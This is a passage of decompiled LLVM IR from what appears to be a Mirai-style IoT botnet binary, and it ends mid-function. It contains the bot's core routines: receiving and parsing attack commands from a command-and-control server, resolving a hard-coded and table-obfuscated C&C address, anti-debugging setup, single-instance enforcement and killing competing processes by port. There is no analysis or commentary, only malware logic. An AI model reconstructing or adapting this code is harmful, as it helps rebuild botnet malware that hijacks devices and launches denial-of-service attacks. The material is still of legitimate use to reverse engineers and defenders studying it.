dec_label_pc_14bcc:                               ; preds = %dec_label_pc_14b74
  %v0_14bcc = call i32 @__GI___errno_location()
  %v1_14bd4 = inttoptr i32 %v0_14bcc to i32*
  %v2_14bd4 = load i32, i32* %v1_14bd4, align 4
  %v7_14bd8 = icmp eq i32 %v2_14bd4, 11
  br i1 %v7_14bd8, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bcc
  %v0_14be0 = call i32 @__GI___errno_location()
  %v1_14be8 = inttoptr i32 %v0_14be0 to i32*
  %v2_14be8 = load i32, i32* %v1_14be8, align 4
  %v7_14bec = icmp eq i32 %v2_14be8, 11
  br i1 %v7_14bec, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14be0
  %v0_14bf4 = call i32 @__GI___errno_location()
  %v1_14bfc = inttoptr i32 %v0_14bf4 to i32*
  %v2_14bfc = load i32, i32* %v1_14bfc, align 4
  %v7_14c00 = icmp eq i32 %v2_14bfc, 4
  br i1 %v7_14c00, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %dec_label_pc_14bf4
  br label %dec_label_pc_14c10

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14b74, %dec_label_pc_14c08
  %n_-28.1 = phi i32 [ 0, %dec_label_pc_14c08 ], [ %v4_14bb4, %dec_label_pc_14b74 ]
  %v2_14c14 = icmp eq i32 %n_-28.1, 0
  br i1 %v2_14c14, label %dec_label_pc_14c1c, label %dec_label_pc_14c24

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14c10
  call void @teardown_connection()
  br label %dec_label_pc_144f0.lr.ph

dec_label_pc_14c24:                               ; preds = %dec_label_pc_14c10
  %v2_14c28 = load i32, i32* @fd_serv, align 4
  %v4_14c40 = call i32 @__libc_recv(i32 %v2_14c28, i32 %v2_14a80, i32 2, i32 16384)
  %v3_14c44 = load i32, i32* %err_len_-196, align 4
  %v1_14c4c = call i32 @__GI_ntohs(i32 %v3_14c44)
  store i32 %v1_14c4c, i32* %err_len_-196, align 4
  %v2_14c5c = load i32, i32* @fd_serv, align 4
  %v5_14c84 = call i32 @__libc_recv(i32 %v2_14c5c, i32 %v2_14b9c, i32 %v1_14c4c, i32 16384)
  %v3_14c88 = load i32, i32* %err_len_-196, align 4
  %v2_14c8c = icmp eq i32 %v3_14c88, 0
  br i1 %v2_14c8c, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14c94

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c24
  call void @attack_parse(i8* %tmp80, i32 %v3_14c88)
  br label %dec_label_pc_144f0.lr.ph

; uselistorder directives
  uselistorder i32 %v2_14a14, { 2, 1, 0 }
  uselistorder i8 %v3_149d8, { 1, 0 }
  uselistorder i32 %v2_14888, { 2, 1, 0 }
  uselistorder i32 %v2_147c8, { 3, 2, 1, 0 }
  uselistorder i32 %wfd_-60.1, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_14720, { 1, 0 }
  uselistorder i32 %v2_14678, { 1, 0 }
  uselistorder i32 %v2_14558, { 2, 1, 0 }
  uselistorder %anon_struct_2* %v4_14544, { 1, 0 }
  uselistorder i32 %v1_14540, { 1, 0 }
  uselistorder i32 %v4_1454882, { 1, 0 }
  uselistorder i32 %storemerge2026, { 1, 0 }
  uselistorder i32 %wfd_-60.0, { 2, 3, 0, 1 }
  uselistorder i32 %v2_14518, { 1, 0 }
  uselistorder i32 %v2_144dc, { 1, 0 }
  uselistorder i32 %v2_1439c, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v3_1421c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder %anon_struct_1.23* %sigs_-152, { 1, 0 }
  uselistorder %timeval_1* %timeo_-160, { 1, 0 }
  uselistorder void ()* @teardown_connection, { 2, 1, 0 }
  uselistorder i32 -300, { 1, 2, 0, 3 }
  uselistorder void ()* @scanner_init, { 1, 0 }
  uselistorder void (i8*, i32)* @rand_alphastr, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder label %dec_label_pc_14c10, { 1, 0 }
  uselistorder label %dec_label_pc_14b74, { 1, 0 }
  uselistorder label %dec_label_pc_14af4, { 1, 0 }
  uselistorder label %dec_label_pc_14868, { 2, 0, 1 }
  uselistorder label %dec_label_pc_147c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146b8, { 1, 0 }
  uselistorder label %dec_label_pc_145dc, { 1, 0 }
  uselistorder label %dec_label_pc_145c8, { 1, 0 }
  uselistorder label %dec_label_pc_1452c, { 1, 0 }
  uselistorder label %dec_label_pc_144f0, { 1, 0 }
  uselistorder label %dec_label_pc_144f0.lr.ph, { 11, 0, 12, 1, 2, 3, 13, 14, 4, 5, 6, 7, 8, 15, 9, 16, 17, 10, 18 }
  uselistorder label %dec_label_pc_1436c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142dc, { 1, 0 }
  uselistorder label %dec_label_pc_14268, { 1, 0 }
  uselistorder label %dec_label_pc_14234, { 1, 0 }
}

define i32 @function_14ce0(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ce0:
  %v0_14ce0 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_14ce0, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_14ce0
  %v1_14ce0 = load i32, i32* @lr, align 4
  %v2_14ce0 = load i32, i32* @r5, align 4
  %v3_14ce0 = load i32, i32* @sl, align 4
  %v4_14ce0 = add i32 %v3_14ce0, -1
  %v5_14ce0 = shl i32 1, %v4_14ce0
  %v6_14ce0 = and i32 %v5_14ce0, %v2_14ce0
  %v7_14ce0 = icmp ne i32 %v6_14ce0, 0
  store i1 %v7_14ce0, i1* @cpsr_c, align 1
  %v8_14ce0 = lshr i32 %v2_14ce0, %v3_14ce0
  %v9_14ce0 = sub i32 -1, %v8_14ce0
  %v10_14ce0 = and i32 %v1_14ce0, %v9_14ce0
  store i32 %v10_14ce0, i32* @ip, align 4
  %v11_14ce0 = icmp slt i32 %v10_14ce0, 0
  %v12_14ce0 = icmp eq i32 %v10_14ce0, 0
  store i1 %v12_14ce0, i1* @cpsr_z, align 1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_14ce0, %bb
  %v0_14ce4 = phi i1 [ false, %dec_label_pc_14ce0 ], [ %v11_14ce0, %bb ]
  %v1_14ce4 = load i1, i1* @cpsr_v, align 1
  %v2_14ce4 = xor i1 %v0_14ce4, %v1_14ce4
  %v3_14ce4 = xor i1 %v2_14ce4, true
  call void @__pseudo_cond_branch(i1 %v3_14ce4, i32 -22284392)
  %v0_14cf8 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_14cf8, i32 -22284372)
  %v0_14d00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14d00, label %bb3, label %bb4

bb3:                                              ; preds = %bb2
  br label %bb4

bb4:                                              ; preds = %bb2, %bb3
  %v7_14d00 = load i32, i32* @r0, align 4
  ret i32 %v7_14d00

; uselistorder directives
  uselistorder i32 %v3_14ce0, { 1, 0 }
  uselistorder i32 %v2_14ce0, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define void @anti_gdb_entry(i32 %sig) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_14d38.143 to i32), i32* bitcast (void ()** @resolve_func to i32*), align 4
  ret void
}

define void @resolve_cnc_addr() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 85316, i32* %stack_var_-4, align 4
  %v2_14d40 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14d40, i32* @fp, align 4
  %v1_14d4c = call i32 @__GI_htonl(i32 -1178808733)
  store i32 %v1_14d4c, i32* @global_var_2ed84.129, align 4
  call void @table_unlock_val(i8 4)
  %v3_14d6c = call i8* @table_retrieve_val(i32 4, i32* null)
  %v1_14d74 = bitcast i8* %v3_14d6c to i16*
  %v2_14d74 = load i16, i16* %v1_14d74, align 2
  store i16 %v2_14d74, i16* bitcast (i32* @global_var_2ed82.130 to i16*), align 4
  call void @table_lock_val(i8 4)
  ret void

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @"$d.11"(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d94:
  %v0_14d94 = load i1, i1* @cpsr_n, align 1
  %v1_14d94 = load i1, i1* @cpsr_v, align 1
  %v2_14d94 = xor i1 %v0_14d94, %v1_14d94
  br i1 %v2_14d94, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_14d94
  %v3_14d94 = load i32, i32* @ip, align 4
  %v4_14d94 = add i32 %v3_14d94, 4
  %v5_14d94 = inttoptr i32 %v4_14d94 to i32*
  %v6_14d94 = load i32, i32* %v5_14d94, align 4
  %v28_14d94 = add i32 %v3_14d94, 36
  %v29_14d94 = inttoptr i32 %v28_14d94 to i32*
  %v30_14d94 = load i32, i32* %v29_14d94, align 4
  call void @__pseudo_branch(i32 %v30_14d94)
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_14d94, %bb
  %.0 = phi i32 [ %v6_14d94, %bb ], [ undef, %dec_label_pc_14d94 ]
  %v0_14d98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14d98, label %bb2, label %bb3

bb2:                                              ; preds = %bb1
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  ret i32 %.0

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define void @establish_connection() local_unnamed_addr {
entry:
  %v3_14da0 = load i32, i32* @r4, align 4
  %v13_14da0 = load i32, i32* @lr, align 4
  %v3_14db8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_14db8, i32* @fd_serv, align 4
  %v7_14dd0 = icmp eq i32 %v3_14db8, -1
  br i1 %v7_14dd0, label %dec_label_pc_14e58, label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %entry
  store i32 %v3_14db8, i32* @r4, align 4
  store i32 %v3_14db8, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_14df4 = call i32 @__libc_fcntl(i32 %v3_14db8, i32 3)
  %v1_14dfc = or i32 %v2_14df4, 2048
  store i32 %v1_14dfc, i32* @r3, align 4
  %v0_14e00 = load i32, i32* @r4, align 4
  store i32 %v1_14dfc, i32* @r2, align 4
  %v2_14e0c = call i32 @__libc_fcntl(i32 %v0_14e00, i32 4)
  %v2_14e14 = load i32, i32* bitcast (void ()** @resolve_func to i32*), align 4
  %v2_14e18 = icmp eq i32 %v2_14e14, 0
  br i1 %v2_14e18, label %dec_label_pc_14e30, label %dec_label_pc_14e20

dec_label_pc_14e20:                               ; preds = %dec_label_pc_14dd8
  call void @__pseudo_branch(i32 %v2_14e14)
  br label %dec_label_pc_14e30

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14dd8, %dec_label_pc_14e20
  store i8 1, i8* @pending_connection, align 1
  %v2_14e40 = load i32, i32* @fd_serv, align 4
  %v3_14e54 = call i32 @__libc_connect(i32 %v2_14e40, i32 ptrtoint (i32* @srv_addr to i32), i32 16)
  br label %dec_label_pc_14e58

dec_label_pc_14e58:                               ; preds = %entry, %dec_label_pc_14e30
  store i32 %v3_14da0, i32* @r4, align 4
  store i32 %v13_14da0, i32* @lr, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v3_14db8, { 3, 2, 1, 0, 4 }
  uselistorder i32* @srv_addr, { 1, 0 }
  uselistorder i32* bitcast (void ()** @resolve_func to i32*), { 1, 0 }
  uselistorder label %dec_label_pc_14e58, { 1, 0 }
  uselistorder label %dec_label_pc_14e30, { 1, 0 }
}

define void @teardown_connection() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_14e78 = load i32, i32* @fp, align 4
  store i32 %v3_14e78, i32* %stack_var_-16, align 4
  %v2_14e84 = load i32, i32* @fd_serv, align 4
  %v7_14e88 = icmp eq i32 %v2_14e84, -1
  br i1 %v7_14e88, label %dec_label_pc_14ea0, label %dec_label_pc_14e90

dec_label_pc_14e90:                               ; preds = %entry
  %v1_14e9c = call i32 @__GI___libc_close(i32 %v2_14e84)
  br label %dec_label_pc_14ea0

dec_label_pc_14ea0:                               ; preds = %entry, %dec_label_pc_14e90
  store i32 -1, i32* @fd_serv, align 4
  %v1_14eb0 = call i32 @sleep(i32 1)
  %v2_14eb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14eb8, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v2_14e84, { 1, 0 }
  uselistorder i32* @fd_serv, { 1, 5, 6, 2, 7, 8, 9, 3, 10, 11, 12, 13, 14, 15, 16, 4, 17, 18, 19, 20, 0, 21 }
  uselistorder label %dec_label_pc_14ea0, { 1, 0 }
}

define void @ensure_single_instance() local_unnamed_addr {
entry:
  %addr_-40 = alloca i32, align 4
  %addr_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_14ec8 = load i32, i32* @r4, align 4
  %v6_14ec8 = load i32, i32* @fp, align 4
  store i32 85712, i32* %stack_var_-4, align 4
  %v2_14ecc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14ecc, i32* @fp, align 4
  store i32 1, i32* %addr_-44, align 4
  %v3_14ee8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_14ee8, i32* @fd_ctrl, align 4
  %v7_14f00 = icmp eq i32 %v3_14ee8, -1
  br i1 %v7_14f00, label %dec_label_pc_150b0, label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %entry
  %v2_14f10 = ptrtoint i32* %addr_-44 to i32
  %v5_14f2c = call i32 @__GI_setsockopt(i32 %v3_14ee8, i32 1, i32 2, i32 %v2_14f10, i32 4)
  %v2_14f34 = load i32, i32* @fd_ctrl, align 4
  store i32 %v2_14f34, i32* @r4, align 4
  store i32 %v2_14f34, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_14f4c = call i32 @__libc_fcntl(i32 %v2_14f34, i32 3)
  %v1_14f54 = or i32 %v2_14f4c, 2048
  store i32 %v1_14f54, i32* @r3, align 4
  %v0_14f58 = load i32, i32* @r4, align 4
  store i32 %v1_14f54, i32* @r2, align 4
  %v2_14f64 = call i32 @__libc_fcntl(i32 %v0_14f58, i32 4)
  store i32 2, i32* %addr_-40, align 4
  %v2_14f74 = load i8, i8* bitcast (i8** @global_var_2c0cc.153 to i8*), align 4
  %v2_14f78 = icmp eq i8 %v2_14f74, 0
  br i1 %v2_14f78, label %dec_label_pc_14f94, label %dec_label_pc_14f80

dec_label_pc_14f80:                               ; preds = %dec_label_pc_14f08
  %v1_14f88 = call i32 @__GI_htonl(i32 2130706433)
  br label %dec_label_pc_14fa0

dec_label_pc_14f94:                               ; preds = %dec_label_pc_14f08
  br label %dec_label_pc_14fa0

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f80, %dec_label_pc_14f94
  %v1_14fb0 = call i32 @__GI_htons(i32 49101)
  %v0_14fbc = call i32 @__GI___errno_location()
  %v2_14fc8 = inttoptr i32 %v0_14fbc to i32*
  store i32 0, i32* %v2_14fc8, align 4
  %v2_14fd0 = load i32, i32* @fd_ctrl, align 4
  %v2_14fd4 = ptrtoint i32* %addr_-40 to i32
  %v5_14fe4 = call i32 @bind(i32 %v2_14fd0, i32 %v2_14fd4, i32 16, i32 %v2_14fd4, i32 ptrtoint (i32* @0 to i32))
  %v3_14fec = icmp eq i32 %v5_14fe4, -1
  br i1 %v3_14fec, label %dec_label_pc_14ff4, label %dec_label_pc_1509c

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fa0
  %v0_14ff4 = call i32 @__GI___errno_location()
  %v1_14ffc = inttoptr i32 %v0_14ff4 to i32*
  %v2_14ffc = load i32, i32* %v1_14ffc, align 4
  %v7_15000 = icmp eq i32 %v2_14ffc, 99
  br i1 %v7_15000, label %dec_label_pc_15008, label %dec_label_pc_15024

dec_label_pc_15008:                               ; preds = %dec_label_pc_14ff4
  %v2_1500c = load i8, i8* bitcast (i8** @global_var_2c0cc.153 to i8*), align 4
  %v2_15010 = icmp eq i8 %v2_1500c, 0
  br i1 %v2_15010, label %dec_label_pc_15024, label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_15008
  store i8 0, i8* bitcast (i8** @global_var_2c0cc.153 to i8*), align 4
  br label %dec_label_pc_15024

dec_label_pc_15024:                               ; preds = %dec_label_pc_14ff4, %dec_label_pc_15008, %dec_label_pc_15018
  store i32 2, i32* %addr_-40, align 4
  %v1_1503c = call i32 @__GI_htons(i32 49101)
  %v2_1504c = load i32, i32* @fd_ctrl, align 4
  %v3_15060 = call i32 @__libc_connect(i32 %v2_1504c, i32 %v2_14fd4, i32 16)
  %v1_15068 = call i32 @sleep(i32 5)
  %v2_15070 = load i32, i32* @fd_ctrl, align 4
  %v1_15078 = call i32 @__GI___libc_close(i32 %v2_15070)
  %v1_15084 = call i32 @__GI_htons(i32 49101)
  %v1_1508c = trunc i32 %v1_15084 to i16
  %v3_15090 = call i8 @killer_kill_by_port(i16 %v1_1508c)
  call void @ensure_single_instance()
  br label %dec_label_pc_150b0

dec_label_pc_1509c:                               ; preds = %dec_label_pc_14fa0
  %v2_150a0 = load i32, i32* @fd_ctrl, align 4
  %v2_150ac = call i32 @listen(i32 %v2_150a0, i32 1)
  br label %dec_label_pc_150b0

dec_label_pc_150b0:                               ; preds = %entry, %dec_label_pc_15024, %dec_label_pc_1509c
  store i32 %v3_14ec8, i32* @r4, align 4
  store i32 %v6_14ec8, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v2_14fd4, { 0, 2, 1 }
  uselistorder i32 %v3_14ee8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %addr_-44, { 1, 0 }
  uselistorder i32* %addr_-40, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @listen, { 1, 0 }
  uselistorder void ()* @ensure_single_instance, { 1, 0 }
  uselistorder i8 (i16)* @killer_kill_by_port, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bind, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2c0cc.153 to i8*), { 0, 2, 1 }
  uselistorder i32* @fd_ctrl, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_150b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15024, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14fa0, { 1, 0 }
}

define i8 @unlock_tbl_if_nodebug(i8* %argv0) local_unnamed_addr {
entry:
  %buf_dst_-62 = alloca [12 x i8], align 1
  %buf_src_-50 = alloca [18 x i8], align 1
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_150cc = load i32, i32* @fp, align 4
  store i32 %v3_150cc, i32* %stack_var_-16, align 4
  %v10_150cc = load i32, i32* @lr, align 4
  store i32 86228, i32* %stack_var_-4, align 4
  %v13_150cc = ptrtoint i32* %stack_var_-16 to i32
  %v2_150d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_150d0, i32* @fp, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_22eb8.156 to i32), i32* @r3, align 4
  %v2_150e0 = ptrtoint [18 x i8]* %buf_src_-50 to i32
  store i32 18, i32* @ip, align 4
  store i32 %v2_150e0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_22eb8.156 to i32), i32* @r1, align 4
  store i32 18, i32* @r2, align 4
  %v0_150f4 = call i32 @memcpy()
  %v2_15150 = add i32 %v13_150cc, -84
  br label %dec_label_pc_15140

dec_label_pc_15140:                               ; preds = %entry, %dec_label_pc_15140
  %storemerge810 = phi i32 [ 0, %entry ], [ %v1_15170, %dec_label_pc_15140 ]
  %c_-24.09 = phi i32 [ 0, %entry ], [ %v2_15164, %dec_label_pc_15140 ]
  %v3_15148 = mul nuw nsw i32 %storemerge810, 4
  %v2_15154 = add i32 %v2_15150, %v3_15148
  %v1_15158 = inttoptr i32 %v2_15154 to i32*
  %v2_15158 = load i32, i32* %v1_15158, align 4
  %v2_15164 = add i32 %v2_15158, %c_-24.09
  %v1_15170 = add nuw nsw i32 %storemerge810, 1
  %v7_15180 = icmp slt i32 %v1_15170, 7
  br i1 %v7_15180, label %dec_label_pc_15140, label %dec_label_pc_15184

dec_label_pc_15184:                               ; preds = %dec_label_pc_15140
  %v2_15188 = icmp eq i32 %v2_15164, 0
  br i1 %v2_15188, label %dec_label_pc_15190, label %dec_label_pc_1519c

dec_label_pc_15190:                               ; preds = %dec_label_pc_15184
  br label %dec_label_pc_1534c

dec_label_pc_1519c:                               ; preds = %dec_label_pc_15184
  %v2_152fc = add i32 %v13_150cc, -68
  %v1_15300 = inttoptr i32 %v2_152fc to i32*
  %v2_15300 = load i32, i32* %v1_15300, align 4
  call void @__pseudo_branch(i32 %v2_15300)
  %tmp35 = getelementptr inbounds [12 x i8], [12 x i8]* %buf_dst_-62, i32 0, i32 0
  %v6_15318 = call i8 @util_strcmp(i8* %argv0, i8* %tmp35)
  %tmp36 = getelementptr inbounds [18 x i8], [18 x i8]* %buf_src_-50, i32 0, i32 0
  call void @util_zero(i8* %tmp36, i32 18)
  call void @util_zero(i8* %tmp35, i32 12)
  br label %dec_label_pc_1534c

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15190, %dec_label_pc_1519c
  %storemerge = phi i8 [ %v6_15318, %dec_label_pc_1519c ], [ 0, %dec_label_pc_15190 ]
  %v2_15358 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15358, i32* @fp, align 4
  store i32 %v10_150cc, i32* @lr, align 4
  ret i8 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge810, { 1, 0 }
  uselistorder i32 %v13_150cc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 (i8*, i8*)* @util_strcmp, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1534c, { 1, 0 }
  uselistorder label %dec_label_pc_15140, { 1, 0 }
}

define void @rand_init() local_unnamed_addr {
entry:
  %v2_15380 = call i32 @__GI_time(i32* null)
  store i32 %v2_15380, i32* @x, align 4
  %v0_15394 = call i32 @__getpid()
  store i32 %v0_15394, i32* @r0, align 4
  %v0_1539c = call i32 @getppid()
  %v2_153a4 = xor i32 %v0_15394, %v0_1539c
  store i32 %v2_153a4, i32* @y, align 4
  %v0_153b4 = call i32 @clock()
  store i32 %v0_153b4, i32* @z, align 4
  %v2_153d4 = load i32, i32* @y, align 4
  %v2_153d8 = xor i32 %v2_153d4, %v0_153b4
  store i32 %v2_153d8, i32* @w, align 4
  ret void

; uselistorder directives
  uselistorder i32 ()* @getppid, { 0, 2, 1 }
  uselistorder i32 ()* @__getpid, { 0, 2, 1 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_15414 = load i32, i32* @x, align 4
  %v3_15420 = mul i32 %v2_15414, 2048
  %v2_15428 = xor i32 %v3_15420, %v2_15414
  %v3_15434 = udiv i32 %v2_15428, 256
  %v2_15448 = load i32, i32* @y, align 4
  store i32 %v2_15448, i32* @x, align 4
  %v2_15458 = load i32, i32* @z, align 4
  store i32 %v2_15458, i32* @y, align 4
  %v2_15468 = load i32, i32* @w, align 4
  store i32 %v2_15468, i32* @z, align 4
  %v3_1547c = udiv i32 %v2_15468, 524288
  %v2_15488 = xor i32 %v3_15434, %v2_15428
  %v2_1543c = xor i32 %v2_15488, %v2_15468
  %v2_154a0 = xor i32 %v2_1543c, %v3_1547c
  store i32 %v2_154a0, i32* @w, align 4
  ret i32 %v2_154a0

; uselistorder directives
  uselistorder i32 %v2_15468, { 1, 0, 2 }
  uselistorder i32 %v2_15428, { 1, 0 }
  uselistorder i32 %v2_15414, { 1, 0 }
  uselistorder i32* @w, { 0, 2, 1 }
  uselistorder i32* @z, { 0, 2, 1 }
  uselistorder i32* @y, { 0, 2, 3, 1 }
  uselistorder i32* @x, { 0, 2, 1 }
}

define void @rand_str(i8* %str, i32 %len) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %str to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_154e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %len, i32* %stack_var_-32, align 4
  %v5_1559c5 = icmp sgt i32 %len, 0
  br i1 %v5_1559c5, label %dec_label_pc_154f0, label %dec_label_pc_155a0

dec_label_pc_154f0:                               ; preds = %entry, %dec_label_pc_15594.backedge
  %v3_15528 = phi i32 [ %v3_15594.be, %dec_label_pc_15594.backedge ], [ %len, %entry ]
  %stack_var_-28.07.in = phi i32 [ %stack_var_-28.0.in.be, %dec_label_pc_15594.backedge ], [ %v0_154e4, %entry ]
  %stack_var_-28.07 = inttoptr i32 %stack_var_-28.07.in to i8*
  %v7_154f8 = icmp slt i32 %v3_15528, 4
  br i1 %v7_154f8, label %dec_label_pc_15528, label %dec_label_pc_154fc

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154f0
  %v0_15500 = call i32 @rand_next()
  store i32 %v0_15500, i32* %r0.global-to-local, align 4
  %v2_15508 = inttoptr i32 %stack_var_-28.07.in to i32*
  store i32 %v0_15500, i32* %v2_15508, align 4
  %v1_15510 = add i32 %stack_var_-28.07.in, 4
  %v3_15518 = load i32, i32* %stack_var_-32, align 4
  %v1_1551c = add i32 %v3_15518, -4
  store i32 %v1_1551c, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15594.backedge

dec_label_pc_15528:                               ; preds = %dec_label_pc_154f0
  %v7_15530 = icmp slt i32 %v3_15528, 2
  br i1 %v7_15530, label %dec_label_pc_15568, label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %dec_label_pc_15528
  %v0_15538 = call i32 @rand_next()
  store i32 %v0_15538, i32* %r0.global-to-local, align 4
  %v1_15548 = trunc i32 %v0_15538 to i16
  %v3_15548 = inttoptr i32 %stack_var_-28.07.in to i16*
  store i16 %v1_15548, i16* %v3_15548, align 2
  %v1_15550 = add i32 %stack_var_-28.07.in, 2
  %v3_15558 = load i32, i32* %stack_var_-32, align 4
  %v1_1555c = add i32 %v3_15558, -2
  store i32 %v1_1555c, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15594.backedge

dec_label_pc_15568:                               ; preds = %dec_label_pc_15528
  %v0_15568 = call i32 @rand_next()
  store i32 %v0_15568, i32* %r0.global-to-local, align 4
  %v1_15578 = trunc i32 %v0_15568 to i8
  store i8 %v1_15578, i8* %stack_var_-28.07, align 1
  %v1_15580 = add i32 %stack_var_-28.07.in, 1
  %v3_15588 = load i32, i32* %stack_var_-32, align 4
  %v1_1558c = add i32 %v3_15588, -1
  store i32 %v1_1558c, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15594.backedge

dec_label_pc_15594.backedge:                      ; preds = %dec_label_pc_15568, %dec_label_pc_154fc, %dec_label_pc_15534
  %v3_15594.be = phi i32 [ %v1_1555c, %dec_label_pc_15534 ], [ %v1_1551c, %dec_label_pc_154fc ], [ %v1_1558c, %dec_label_pc_15568 ]
  %stack_var_-28.0.in.be = phi i32 [ %v1_15550, %dec_label_pc_15534 ], [ %v1_15510, %dec_label_pc_154fc ], [ %v1_15580, %dec_label_pc_15568 ]
  %v5_1559c = icmp sgt i32 %v3_15594.be, 0
  br i1 %v5_1559c, label %dec_label_pc_154f0, label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %dec_label_pc_15594.backedge, %entry
  ret void

; uselistorder directives
  uselistorder i32 %v3_15594.be, { 1, 0 }
  uselistorder i32 %stack_var_-28.07.in, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_15594.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_154f0, { 1, 0 }
}

define void @rand_alphastr(i8* %str, i32 %len) local_unnamed_addr {
entry:
  %alphaset_-61 = alloca [33 x i8], align 1
  %stack_var_-16 = alloca i32, align 4
  %v3_155b0 = load i32, i32* @fp, align 4
  store i32 %v3_155b0, i32* %stack_var_-16, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_22ecc.181 to i32), i32* @r3, align 4
  %v2_155c8 = ptrtoint [33 x i8]* %alphaset_-61 to i32
  store i32 33, i32* @ip, align 4
  store i32 %v2_155c8, i32* @r0, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_22ecc.181 to i32), i32* @r1, align 4
  store i32 33, i32* @r2, align 4
  %v0_155dc = call i32 @memcpy()
  %v5_156dc15 = icmp sgt i32 %len, 0
  br i1 %v5_156dc15, label %dec_label_pc_155e4.lr.ph, label %dec_label_pc_156e0

dec_label_pc_155e4.lr.ph:                         ; preds = %entry
  %v13_155b0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_15634 = add i32 %v13_155b0, -45
  br label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155e4.lr.ph, %dec_label_pc_156d4.backedge
  %stack_var_-72.017 = phi i32 [ %len, %dec_label_pc_155e4.lr.ph ], [ %stack_var_-72.0.be, %dec_label_pc_156d4.backedge ]
